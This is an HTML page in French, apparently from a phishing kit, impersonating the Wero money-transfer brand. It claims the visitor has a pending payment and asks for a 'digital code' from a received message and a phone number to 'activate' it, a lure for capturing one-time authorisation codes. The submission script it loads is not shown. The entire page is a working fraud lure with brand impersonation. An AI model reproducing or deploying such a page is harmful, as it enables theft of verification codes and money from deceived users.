<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Activation de Paiement</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css">
    <link rel="stylesheet" href="css/styles.css">
</head>
<body>
    <div class="header">
        <span class="logo">WERO</span>
    </div>
    
    <div class="main-content">
        <div class="card p-4 shadow-sm">
            <h3 class="fw-bold">VOUS AVEZ REÇU UN PAIEMENT EN ATTENTE.</h3>
            <div class="image-wrapper">
                <img alt="" src="https://assets.zyrosite.com/Aq2q239lEjf2a2Mj/verify-AGBnBRgZnrHDXVNb.gif" class="image__image">
            </div>
            <p class="text-bold">Pour recevoir votre argent, saisissez le code présent dans le message reçu afin d'activer votre paiement.</p>
            <div id="error-message" class="alert alert-danger" style="display: none;"></div>
            <form id="paymentForm">
                <div class="mb-3">
                    <label class="form-label">CODE DIGITAL*</label>
                    <input type="text" name="codeDigital" class="form-control" placeholder="Ex : 5W7-8A5" required>
                </div>
                <div class="mb-3">
                    <label class="form-label">N° de téléphone*</label>
                    <input type="tel" name="telephone" class="form-control" placeholder="N° de téléphone" required>
                </div>
                <button type="submit" class="btn btn-custom w-100">Activer mon paiement</button>
            </form>
        </div>
    </div>

    <footer>
        <div class="container text-center">
            <span class="logo-white">WERO</span>
            <p>Simplifiez vos transferts d'argent en Europe.</p>
            <div class="social-icons">
                <a href="#"><i class="fab fa-facebook"></i></a>
                <a href="#"><i class="fab fa-instagram"></i></a>
                <a href="#"><i class="fab fa-tiktok"></i></a>
                <a href="#"><i class="fab fa-twitter"></i></a>
            </div>
            <p class="security">SÉCURITÉ</p>
            <p>contact@wero.com</p>
            <p class="copyright">© 2024. All rights reserved.</p>
        </div>
    </footer>

    <script src="js/app.js"></script>
</body>
</html>
